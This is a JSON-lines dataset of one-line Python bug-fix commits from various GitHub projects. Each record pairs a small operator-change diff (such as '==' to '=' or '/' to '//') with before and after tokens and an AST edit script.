{"project": "populus", "commit_sha": "7a3e926cae86599337b11c0ffedc1a07fd7b3968", "parent_sha": "a884e6e965a0a131ff729ed1bf618f351f187aa4", "file_path": "populus/migrations/registrar.py", "project_url": "https://github.com/pipermerriam/populus", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -56,7 +56,7 @@ def get_registrar(web3, address=None):\n         bytecode_runtime=registrar_contract_data['bytecode_runtime'],\n     )\n     if address is not None:\n-        kwargs['address'] == address\n+        kwargs['address'] = address\n     return web3.eth.contract(**kwargs)\n \n \n", "before": "kwargs [ 'address' ] == address", "after": "kwargs [ 'address' ] = address", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"expression_statement\", 3, 9, 3, 37], [\"assignment\", \"N0\"], 0], [\"Move\", \"N0\", [\"subscript\", 3, 9, 3, 26], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:address\", 3, 30, 3, 37], 2], [\"Delete\", [\"==:==\", 3, 27, 3, 29]], [\"Delete\", [\"comparison_operator\", 3, 9, 3, 37]]]"}
{"project": "mdcs-py", "commit_sha": "921ae4574549164c419fe1c7bf7bc591e618f433", "parent_sha": "a49212ee99008fee0137539a8e02b397bcbff034", "file_path": "scripts/Base/Base.py", "project_url": "https://github.com/PolarGeospatialCenter/mdcs-py", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -675,7 +675,7 @@ class Base(object):\n \n                     uValue = usr_key[first:second]\n \n-                    if (uValue.upper() is self.m_dynamic_params.keys()):\n+                    if (uValue.upper() in self.m_dynamic_params.keys()):\n                         revalue.append(self.m_dynamic_params[uValue.upper()])\n                     else:\n                         if (uValue.find('\\$') >= 0):\n", "before": "if ( uValue . upper ( ) is self . m_dynamic_params . keys ( ) ) : revalue . append ( self . m_dynamic_params [ uValue . upper ( ) ] ) else : if ( uValue . find ( '\\$' ) >= 0 ) : ", "after": "if ( uValue . upper ( ) in self . m_dynamic_params . keys ( ) ) : revalue . append ( self . m_dynamic_params [ uValue . upper ( ) ] ) else : if ( uValue . find ( '\\$' ) >= 0 ) : ", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 25, 3, 71], [\"in:in\", \"T\"], 1], [\"Delete\", [\"is:is\", 3, 40, 3, 42]]]"}
{"project": "cython", "commit_sha": "5e97dbcbd35e827bd26bc2970466f0cddd04d7b7", "parent_sha": "0a2e03f9f41fb405055afd7aa0bb57286293a3f6", "file_path": "Cython/Compiler/Optimize.py", "project_url": "https://github.com/jdemeyer/cython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1723,7 +1723,7 @@ class EarlyReplaceBuiltinCalls(Visitor.EnvTransform):\n         if len(args) <= 1:\n             if len(args) == 1 and args[0].is_sequence_constructor:\n                 args = args[0].args\n-            if len(args) < 1:\n+            if len(args) <= 1:\n                 # leave this to Python\n                 return node\n \n", "before": "if len ( args ) < 1 : return node", "after": "if len ( args ) <= 1 : return node", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 16, 3, 29], [\"<=:<=\", \"T\"], 1], [\"Delete\", [\"<:<\", 3, 26, 3, 27]]]"}
{"project": "Griduniverse", "commit_sha": "92f21f6d93e4a5f289b5fd3dfde281dc8035ca64", "parent_sha": "f25b3f624ed42c3ace7b009610a35077482d35eb", "file_path": "grid.py", "project_url": "https://github.com/Dallinger/Griduniverse", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -233,7 +233,7 @@ class Player(object):\n         wait_time = 1.0 / self.speed_limit\n         can_move = now_relative > (self.motion_timestamp + wait_time)\n \n-        can_afford_to_move = self.score > self.motion_cost\n+        can_afford_to_move = self.score >= self.motion_cost\n \n         if can_move and can_afford_to_move:\n             if (self.grid.player_overlap or (\n", "before": "can_afford_to_move = self . score > self . motion_cost", "after": "can_afford_to_move = self . score >= self . motion_cost", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 30, 3, 59], [\">=:>=\", \"T\"], 1], [\"Delete\", [\">:>\", 3, 41, 3, 42]]]"}
{"project": "Griduniverse", "commit_sha": "c974bc41f5d96f71212695d838572b62317bfbc1", "parent_sha": "99c1cfeedc22865d456c6344031eb35da12d44d4", "file_path": "dlgr/griduniverse/experiment.py", "project_url": "https://github.com/Dallinger/Griduniverse", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -735,7 +735,7 @@ class Gridworld(object):\n                 colors.append(player.color)\n                 plurality_color = max(colors, key=colors.count)\n                 if colors.count(plurality_color) > len(colors) / 2.0:\n-                    if (self.rank(plurality_color) < self.rank(player.color)):\n+                    if (self.rank(plurality_color) <= self.rank(player.color)):\n                         color_updates.append((player, plurality_color))\n \n         for (player, color) in color_updates:\n", "before": "if ( self . rank ( plurality_color ) < self . rank ( player . color ) ) : color_updates . append ( ( player , plurality_color ) )", "after": "if ( self . rank ( plurality_color ) <= self . rank ( player . color ) ) : color_updates . append ( ( player , plurality_color ) )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 25, 3, 77], [\"<=:<=\", \"T\"], 1], [\"Delete\", [\"<:<\", 3, 52, 3, 53]]]"}
{"project": "XlsxWriter", "commit_sha": "d43f4d7a87b5670218453087090e25922a731b93", "parent_sha": "0420ce7cd073840ad250f077982e7e501fb1e65b", "file_path": "xlsxwriter/chart.py", "project_url": "https://github.com/viewtao/XlsxWriter", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2951,7 +2951,7 @@ class Chart(xmlwriter.XMLwriter):\n         if not marker:\n             return\n \n-        if marker['type'] is 'automatic':\n+        if marker['type'] == 'automatic':\n             return\n \n         self._xml_start_tag('c:marker')\n", "before": "if marker [ 'type' ] is 'automatic' : return", "after": "if marker [ 'type' ] == 'automatic' : return", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 41], [\"==:==\", \"T\"], 1], [\"Delete\", [\"is:is\", 3, 27, 3, 29]]]"}
{"project": "pyihome", "commit_sha": "c0b18ce2b8dbb6c307e63236a965cd2f0743acde", "parent_sha": "4bfe9d221758c5ed7f6e078443fac5ef576e148e", "file_path": "pyihome/pyihome.py", "project_url": "https://github.com/lmelvin/pyihome", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -57,7 +57,7 @@ class PyiHome:\n             self._set_state(device_id, 0)\n \n         def _set_state(self, device_id, state):\n-            if state == None:\n+            if state is None:\n                 state = 0\n             url = \"{}/{}/properties/targetpowerstate1\".format(API_URLS.api_base, device_id)\n             payload = [{\"value\": str(state)}]\n", "before": "if state == None : state = 0", "after": "if state is None : state = 0", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 16, 3, 29], [\"is:is\", \"T\"], 1], [\"Delete\", [\"==:==\", 3, 22, 3, 24]]]"}
{"project": "gala", "commit_sha": "82378e85edffb4980043ebd7e2f066413d22fb6e", "parent_sha": "ffaa706a3895a58859771c3a4af4ab2d22fd0533", "file_path": "gala/evaluate.py", "project_url": "https://github.com/jakirkham/gala", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -220,7 +220,7 @@ def get_stratified_sample(ar, n):\n     if nu < 2*n:\n         return u\n     else:\n-        step = nu / n\n+        step = nu // n\n         return u[0:nu:step]\n \n \n", "before": "step = nu / n", "after": "step = nu // n", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 16, 3, 22], [\"//://\", \"T\"], 1], [\"Delete\", [\"/:/\", 3, 19, 3, 20]]]"}
{"project": "mitmproxy", "commit_sha": "62176142043efb814608c61edf1e18f91eb7a13f", "parent_sha": "427ba886182563a83f71dc966b139e504f25ad39", "file_path": "mitmproxy/proxy/root_context.py", "project_url": "https://github.com/mariuszkrzaczkowski/mitmproxy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -100,7 +100,7 @@ class RootContext(object):\n         is_ascii = (\n             len(d) == 3 and\n             # expect A-Za-z\n-            all(65 <= x <= 90 and 97 <= x <= 122 for x in six.iterbytes(d))\n+            all(65 <= x <= 90 or 97 <= x <= 122 for x in six.iterbytes(d))\n         )\n         if self.config.rawtcp and not is_ascii:\n             return protocol.RawTCPLayer(top_layer)\n", "before": "is_ascii = ( len ( d ) == 3 and all ( 65 <= x <= 90 and 97 <= x <= 122 for x in six . iterbytes ( d ) ) )", "after": "is_ascii = ( len ( d ) == 3 and all ( 65 <= x <= 90 or 97 <= x <= 122 for x in six . iterbytes ( d ) ) )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 17, 3, 49], [\"or:or\", \"T\"], 1], [\"Delete\", [\"and:and\", 3, 31, 3, 34]]]"}
{"project": "nvda", "commit_sha": "0eca69b9ad2a89755528997ad46e5ddf30dc90c5", "parent_sha": "180ec02339bcd3a33fbe660d7d822f771bd282e9", "file_path": "source/braille.py", "project_url": "https://github.com/mariuszkrzaczkowski/nvda", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -130,7 +130,7 @@ class BrailleBuffer(baseObject.AutoPropertyObject):\n \r\n \tdef bufferPosToRegionPos(self, bufferPos):\r\n \t\tfor region, start, end in self.regionsWithPositions:\r\n-\t\t\tif end >= bufferPos:\r\n+\t\t\tif end > bufferPos:\r\n \t\t\t\treturn region, bufferPos - start\r\n \t\traise LookupError(\"No such position\")\r\n \r\n", "before": "if end >= bufferPos : return region , bufferPos - start", "after": "if end > bufferPos : return region , bufferPos - start", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 7, 3, 23], [\">:>\", \"T\"], 1], [\"Delete\", [\">=:>=\", 3, 11, 3, 13]]]"}
{"project": "nvda", "commit_sha": "3e9afdd7b88e982c85c52da3c44c75f370ea3ddb", "parent_sha": "7fb829ac3d717a764963593f50fb82bfd09ddc04", "file_path": "source/speech.py", "project_url": "https://github.com/mariuszkrzaczkowski/nvda", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -722,7 +722,7 @@ def getSpeechTextForProperties(reason=REASON_QUERY,**propertyValues):\n \tif 'level' in propertyValues:\r\n \t\tlevelNo=propertyValues['level']\r\n \t\tdel propertyValues['level']\r\n-\t\tif levelNo is not None and reason not in (REASON_SAYALL,REASON_CARET,REASON_FOCUS) or (role and role not in userDisabledRoles):\r\n+\t\tif levelNo is not None or reason not in (REASON_SAYALL,REASON_CARET,REASON_FOCUS) or (role and role not in userDisabledRoles):\r\n \t\t\ttextList.append(_(\"level %s\")%levelNo)\r\n \tfor name,value in propertyValues.items():\r\n \t\tif not name.startswith('_') and value is not None and value is not \"\":\r\n", "before": "if levelNo is not None and reason not in ( REASON_SAYALL , REASON_CARET , REASON_FOCUS ) or ( role and role not in userDisabledRoles ) : textList . append ( _ ( \"level %s\" ) % levelNo )", "after": "if levelNo is not None or reason not in ( REASON_SAYALL , REASON_CARET , REASON_FOCUS ) or ( role and role not in userDisabledRoles ) : textList . append ( _ ( \"level %s\" ) % levelNo )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 6, 3, 85], [\"or:or\", \"T\"], 1], [\"Delete\", [\"and:and\", 3, 26, 3, 29]]]"}
{"project": "p2pool-apollo", "commit_sha": "0dfd1cd8709e00ab801329a8b81951edf2df2101", "parent_sha": "360df0ab06979b7bceeba32d9e2f291e859304f6", "file_path": "p2pool/data.py", "project_url": "https://github.com/birdonwheels5/p2pool-apollo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -148,7 +148,7 @@ class Share(object):\n         \n         self.bitcoin_hash = net.BITCOIN_POW_FUNC(header)\n         \n-        if net.BITCOIN_POW_FUNC is bitcoin_data.block_header_type.scrypt:\n+        if net.BITCOIN_POW_FUNC == bitcoin_data.block_header_type.scrypt:\n             # compatibility hack\n             self.hash = share1a_type.scrypt(self.as_share1a())\n         else:\n", "before": "if net . BITCOIN_POW_FUNC is bitcoin_data . block_header_type . scrypt : self . hash = share1a_type . scrypt ( self . as_share1a ( ) ) else : ", "after": "if net . BITCOIN_POW_FUNC == bitcoin_data . block_header_type . scrypt : self . hash = share1a_type . scrypt ( self . as_share1a ( ) ) else : ", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 73], [\"==:==\", \"T\"], 1], [\"Delete\", [\"is:is\", 3, 33, 3, 35]]]"}
{"project": "p2pool-apollo", "commit_sha": "2073539b6f7355bea0151b2cf91deecfcc05f937", "parent_sha": "bfc7337ceed42cc261a1dc3aa9258e0aa99178fe", "file_path": "p2pool/data.py", "project_url": "https://github.com/birdonwheels5/p2pool-apollo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -347,7 +347,7 @@ class Share(object):\n         \n         other_txs = self._get_other_txs(tracker, known_txs)\n         if other_txs is None:\n-            if self.time_seen == 0: # ignore if loaded from ShareStore\n+            if self.time_seen != 0: # ignore if loaded from ShareStore\n                 return True, 'not all txs present'\n         else:\n             all_txs_size = sum(bitcoin_data.tx_type.packed_size(tx) for tx in other_txs)\n", "before": "if self . time_seen == 0 : return True , 'not all txs present'", "after": "if self . time_seen != 0 : return True , 'not all txs present'", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 16, 3, 35], [\"!=:!=\", \"T\"], 1], [\"Delete\", [\"==:==\", 3, 31, 3, 33]]]"}
{"project": "pyem", "commit_sha": "3e26e37ffdfbaafd019749aad65ec469d38b1a72", "parent_sha": "699f18407a89ad75592d5c6636ef7e8471acd793", "file_path": "pyem/mrc.py", "project_url": "https://github.com/asarnow/pyem", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -27,7 +27,7 @@ HEADER_LEN = int(1024)  # Bytes.\n \n \n def mrc_header(shape, dtype=np.float32, psz=1.0):\n-    header = np.zeros(HEADER_LEN / np.dtype(np.int32).itemsize, dtype=np.int32)\n+    header = np.zeros(HEADER_LEN // np.dtype(np.int32).itemsize, dtype=np.int32)\n     header_f = header.view(np.float32)\n     header[:3] = shape\n     if np.dtype(dtype) not in MODE:\n", "before": "header = np . zeros ( HEADER_LEN / np . dtype ( np . int32 ) . itemsize , dtype = np . int32 )", "after": "header = np . zeros ( HEADER_LEN // np . dtype ( np . int32 ) . itemsize , dtype = np . int32 )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 23, 3, 63], [\"//://\", \"T\"], 1], [\"Delete\", [\"/:/\", 3, 34, 3, 35]]]"}
{"project": "raven", "commit_sha": "0e1970554792d0ad41cd7523fc83fe2eb089cd9f", "parent_sha": "c78651b85a23aa52fa465f8b3ec78c9c3cd0204e", "file_path": "StochPoly_framework/Samplers.py", "project_url": "https://github.com/idaholab/raven", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -90,7 +90,7 @@ class Sampler(BaseType):\n     '''this check if the sampler is ready to generate a new input\n        it might not since it is waiting for more information or has \n        run out of limit, depends from the type of sampler'''\n-    if(self.counter <= self.limit): return True\n+    if(self.counter < self.limit): return True\n     else: return False\n \n   def fillDistribution(self,availableDist):\n", "before": "if ( self . counter <= self . limit ) : return True else : return False", "after": "if ( self . counter < self . limit ) : return True else : return False", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 8, 3, 34], [\"<:<\", \"T\"], 1], [\"Delete\", [\"<=:<=\", 3, 21, 3, 23]]]"}
{"project": "pyem", "commit_sha": "20784cd1695017a3a3e383ede8e910d29f57ee4e", "parent_sha": "1bd07d32cf6fe6c80d703fbbd441566e1dde3f66", "file_path": "pyem/mrc.py", "project_url": "https://github.com/asarnow/pyem", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -54,7 +54,7 @@ def mrc_header_complete(data, psz=1.0, origin=None):\n     header_f[54] = np.sqrt(np.mean(data**2))\n     if origin is None:\n         header_f[49:52] = (0, 0, 0)\n-    elif origin is \"center\":\n+    elif origin == \"center\":\n         header_f[49:52] = psz * header[:3] / 2\n     else:\n         header_f[49:52] = origin\n", "before": "if origin is None : header_f [ 49 : 52 ] = ( 0 , 0 , 0 ) elif origin is \"center\" : header_f [ 49 : 52 ] = psz * header [ : 3 ] / 2 else : header_f [ 49 : 52 ] = origin", "after": "if origin is None : header_f [ 49 : 52 ] = ( 0 , 0 , 0 ) elif origin == \"center\" : header_f [ 49 : 52 ] = psz * header [ : 3 ] / 2 else : header_f [ 49 : 52 ] = origin", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 10, 3, 28], [\"==:==\", \"T\"], 1], [\"Delete\", [\"is:is\", 3, 17, 3, 19]]]"}
{"project": "prysm", "commit_sha": "05b872461d3ce33bfadb80a8722f3172e473bc17", "parent_sha": "172a78e53bb6d77c2df1d776f836865e70d740a2", "file_path": "prysm/coordinates.py", "project_url": "https://github.com/brandondube/prysm", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -210,7 +210,7 @@ def v_to_4v2_minus_4v_plus1(v):\n \n \n def v_to_v_plus90(v):\n-    return v + (e.pi/2)\n+    return v - (e.pi/2)\n     # return v\n \n \n", "before": "return v + ( e . pi / 2 )", "after": "return v - ( e . pi / 2 )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 12, 3, 24], [\"-:-\", \"T\"], 1], [\"Delete\", [\"+:+\", 3, 14, 3, 15]]]"}
{"project": "weatherlog", "commit_sha": "af7c82de87a5e42423fd47c5ff174993fc926a30", "parent_sha": "49667e2371ea0e2aef786e17d5945ff3e8875fcd", "file_path": "weatherlog_resources/command_line.py", "project_url": "https://github.com/achesak/weatherlog", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -24,7 +24,7 @@ def add(data, main_dir, last_profile, args):\n         humi = args[6]\n         airp = args[7]\n         clou = args[8]\n-        if len(args) == 10:\n+        if len(args) >= 10:\n             note = args[9]\n         else:\n             note = \"\"\n", "before": "if len ( args ) == 10 : note = args [ 9 ] else : note = \"\"", "after": "if len ( args ) >= 10 : note = args [ 9 ] else : note = \"\"", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 27], [\">=:>=\", \"T\"], 1], [\"Delete\", [\"==:==\", 3, 22, 3, 24]]]"}
{"project": "rhythmbox-fullscreen", "commit_sha": "690158396c50f98ea436a70039a7d6a609d204f0", "parent_sha": "41fad631291978f72ac13e11f2c711a75b464e21", "file_path": "__init__.py", "project_url": "https://github.com/benjaoming/rhythmbox-fullscreen", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -143,7 +143,7 @@ class FullscreenView (rb.Plugin):\n     \n     def notify_metadata(self, db, entry, field=None,metadata=None):\n         \"\"\"Subscribe to metadata changes from database\"\"\"\n-        if entry == self.shell.get_player().get_playing_entry():\n+        if entry != self.shell.get_player().get_playing_entry():\n             self.set_cover_art(entry)\n     \n     def set_cover_art(self, entry):\n", "before": "if entry == self . shell . get_player ( ) . get_playing_entry ( ) : self . set_cover_art ( entry )", "after": "if entry != self . shell . get_player ( ) . get_playing_entry ( ) : self . set_cover_art ( entry )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 64], [\"!=:!=\", \"T\"], 1], [\"Delete\", [\"==:==\", 3, 18, 3, 20]]]"}
{"project": "opps", "commit_sha": "08c560e382e5da1b8714352a2d2f7e7114e79882", "parent_sha": "7a5e6caa0c19cae80741adf3b04d0e0fc8b26bea", "file_path": "opps/articles/models.py", "project_url": "https://github.com/YACOWS/opps", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -160,7 +160,7 @@ class ArticleBoxArticles(models.Model):\n         if not self.article.published:\n             raise ValidationError('Article not published!')\n \n-        if self.article.date_available <= timezone.now():\n+        if self.article.date_available >= timezone.now():\n             raise ValidationError('Article not published!')\n \n \n", "before": "if self . article . date_available <= timezone . now ( ) : raise ValidationError ( 'Article not published!' )", "after": "if self . article . date_available >= timezone . now ( ) : raise ValidationError ( 'Article not published!' )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 57], [\">=:>=\", \"T\"], 1], [\"Delete\", [\"<=:<=\", 3, 40, 3, 42]]]"}
{"project": "pypi", "commit_sha": "2333973077934e4a21ab454d4506bdbd5a0cd47f", "parent_sha": "42110a0f93d112ebd9b6c500c57a2f54da4f171a", "file_path": "store.py", "project_url": "https://github.com/ericholscher/pypi", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -118,7 +118,7 @@ class Store:\n                 self.add_role(self.username, 'Owner', name)\n \n         # handle trove information\n-        if old_cifiers != classifiers:\n+        if old_cifiers == classifiers:\n             return message\n \n         # otherwise save them off\n", "before": "if old_cifiers != classifiers : return message", "after": "if old_cifiers == classifiers : return message", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 38], [\"==:==\", \"T\"], 1], [\"Delete\", [\"!=:!=\", 3, 24, 3, 26]]]"}
{"project": "amber-lib", "commit_sha": "d101ae9337f08b363ae3b751cecf1317a42a6515", "parent_sha": "359e64c3d58bfe37d2ee4bbc91d0a661b9745ed7", "file_path": "amber_lib/resources.py", "project_url": "https://github.com/AmberEngine/amber-lib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -117,7 +117,7 @@ class EmbeddedList(list):\n         if type_ == \"products\":\n             self._pk_field = \"guid\"\n         else:\n-            self._pk_field == \"id\"\n+            self._pk_field = \"id\"\n \n         self._id_mapping = {} # contains pk->index pairs\n         super().__init__(*args, **kwargs)\n", "before": "self . _pk_field == \"id\"", "after": "self . _pk_field = \"id\"", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"expression_statement\", 3, 13, 3, 35], [\"assignment\", \"N0\"], 0], [\"Move\", \"N0\", [\"attribute\", 3, 13, 3, 27], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Move\", \"N0\", [\"string:\\\"id\\\"\", 3, 31, 3, 35], 2], [\"Delete\", [\"==:==\", 3, 28, 3, 30]], [\"Delete\", [\"comparison_operator\", 3, 13, 3, 35]]]"}
{"project": "cadastre-conflation", "commit_sha": "ac61e06c9ce7f686f2fae6cdd92d294a130c674f", "parent_sha": "4c5fe0b05f317f122757f8d46c964fa3e657e3a8", "file_path": "backend/db_utils.py", "project_url": "https://github.com/bagage/cadastre-conflation", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -506,7 +506,7 @@ class Postgis(object):\n                     c.insee = p.insee\n                 ORDER BY\n                     date != 'never', date != 'unknown', date = 'raster', date,\n-                    date_cadastre > NOW() - INTERVAL '30 days',\n+                    date_cadastre < NOW() - INTERVAL '30 days',\n                     random()\n                 LIMIT\n                     1\n", "before": "date_cadastre > NOW ( ) - INTERVAL '30 days' ,", "after": "date_cadastre < NOW ( ) - INTERVAL '30 days' ,", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 21, 3, 63], [\"<:<\", \"T\"], 1], [\"Delete\", [\">:>\", 3, 35, 3, 36]]]"}
{"project": "classement", "commit_sha": "f713b2116ff94cfb444f6b2b018e5355fcab53ca", "parent_sha": "3fcbbc1ab19859a2a5e49ba5888b3c526927a2fe", "file_path": "classement.py", "project_url": "https://github.com/coti/classement", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -196,7 +196,7 @@ def nbInf( myClassement, defaites, E ):\n             if( classementNumerique[ i[0] ] == ( classementNumerique[ myClassement ] - E ) ):\n                 nb = nb+1\n         else:\n-            if( classementNumerique[ i[0] ] < ( classementNumerique[ myClassement ] - 2 ) ):\n+            if( classementNumerique[ i[0] ] <= ( classementNumerique[ myClassement ] - 2 ) ):\n                 nb = nb+1\n \n     return nb\n", "before": "if ( classementNumerique [ i [ 0 ] ] < ( classementNumerique [ myClassement ] - 2 ) ) : nb = nb + 1", "after": "if ( classementNumerique [ i [ 0 ] ] <= ( classementNumerique [ myClassement ] - 2 ) ) : nb = nb + 1", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 17, 3, 90], [\"<=:<=\", \"T\"], 1], [\"Delete\", [\"<:<\", 3, 45, 3, 46]]]"}
{"project": "cuckoo-modified", "commit_sha": "181dabd1fe01dad13de04a550fd22abe83115aaf", "parent_sha": "f50d41624da758a7bf33869aeb61f091bb3e3f85", "file_path": "modules/machinemanagers/vmware_esx.py", "project_url": "https://github.com/wbenny/cuckoo-modified", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -90,7 +90,7 @@ class VMware_ESX(MachineManager):\n         try:\n             machine = self.server.get_vm_by_name(host)\n             #The revert process may start the VM after completion so let's check what our status is and decide what to do.\n-            status == machine.get_status()\n+            status = machine.get_status()\n             \n             if status == \"POWERING ON\":\n                 return True\n", "before": "status == machine . get_status ( )", "after": "status = machine . get_status ( )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"expression_statement\", 3, 13, 3, 43], [\"assignment\", \"N0\"], 0], [\"Move\", \"N0\", [\"identifier:status\", 3, 13, 3, 19], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Move\", \"N0\", [\"call\", 3, 23, 3, 43], 2], [\"Delete\", [\"==:==\", 3, 20, 3, 22]], [\"Delete\", [\"comparison_operator\", 3, 13, 3, 43]]]"}
{"project": "sverchok", "commit_sha": "3fd9920d21d7a4a2bfa7d35b7dd95e9977899076", "parent_sha": "0beb1e9e93ec53eb9a25624b821e1ca20e5d367d", "file_path": "node_Viewer.py", "project_url": "https://github.com/faerietree/sverchok", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -174,7 +174,7 @@ class ViewerNode(Node, SverchCustomTreeNode):\n                 cache_viewer_baker[self.name+self.id_data.name+'m'] = []\n         \n         else:\n-            callback_disable(self.name-self.id_data.name)\n+            callback_disable(self.name+self.id_data.name)\n         \n         if cache_viewer_baker[self.name+self.id_data.name+'v'] or cache_viewer_baker[self.name+self.id_data.name+'m']:\n             callback_enable(self.name+self.id_data.name, cache_viewer_baker[self.name+self.id_data.name+'v'], cache_viewer_baker[self.name+self.id_data.name+'ep'], \\\n", "before": "else : callback_disable ( self . name - self . id_data . name )", "after": "else : callback_disable ( self . name + self . id_data . name )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 30, 3, 57], [\"+:+\", \"T\"], 1], [\"Delete\", [\"-:-\", 3, 39, 3, 40]]]"}
{"project": "VR-RC-Car-project", "commit_sha": "0aa7694441538d4d6a7c2183f48ebd95bb4753e2", "parent_sha": "c9e91b7b568a1ebad24b8aec02bb107c89fa1e26", "file_path": "v7_VRCarcontrol_WebRTC.py", "project_url": "https://github.com/altran-idle-innovation-gbg/VR-RC-Car-project", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -115,7 +115,7 @@ class Car(object):\n             alpha_forward_diff = alpha_forward_diff1\n         else:\n             alpha_forward_diff = alpha_forward_diff2\n-        self.set_camera_direction(7.5+alpha_forward_diff*2.5/90.0)\n+        self.set_camera_direction(7.5-alpha_forward_diff*2.5/90.0)\n \n # ------------------- End Car Class------------------------------\n \n", "before": "self . set_camera_direction ( 7.5 + alpha_forward_diff * 2.5 / 90.0 )", "after": "self . set_camera_direction ( 7.5 - alpha_forward_diff * 2.5 / 90.0 )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 35, 3, 66], [\"-:-\", \"T\"], 1], [\"Delete\", [\"+:+\", 3, 38, 3, 39]]]"}
{"project": "geo-hpc", "commit_sha": "f97bec2e83c731ff0125b13018412b32f9ec9e20", "parent_sha": "53674496e0bc4566347a0a9621219352d0370e1c", "file_path": "src/extract_utility.py", "project_url": "https://github.com/itpir/geo-hpc", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -656,7 +656,7 @@ class ExtractObject():\n                                 feat['properties']['exfield_reliability'] = rval\n \n                             except ZeroDivisionError:\n-                                if feat['properties']['exfield_sum'] > 0:\n+                                if feat['properties']['exfield_sum'] == 0:\n                                     feat['properties']['exfield_reliability'] = 1\n                                 else:\n                                     feat['properties']['exfield_reliability'] = 0\n", "before": "ZeroDivisionError : if feat [ 'properties' ] [ 'exfield_sum' ] > 0 : feat [ 'properties' ] [ 'exfield_reliability' ] = 1", "after": "ZeroDivisionError : if feat [ 'properties' ] [ 'exfield_sum' ] == 0 : feat [ 'properties' ] [ 'exfield_reliability' ] = 1", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 36, 4, 78], [\"==:==\", \"T\"], 1], [\"Delete\", [\">:>\", 3, 70, 3, 71]]]"}
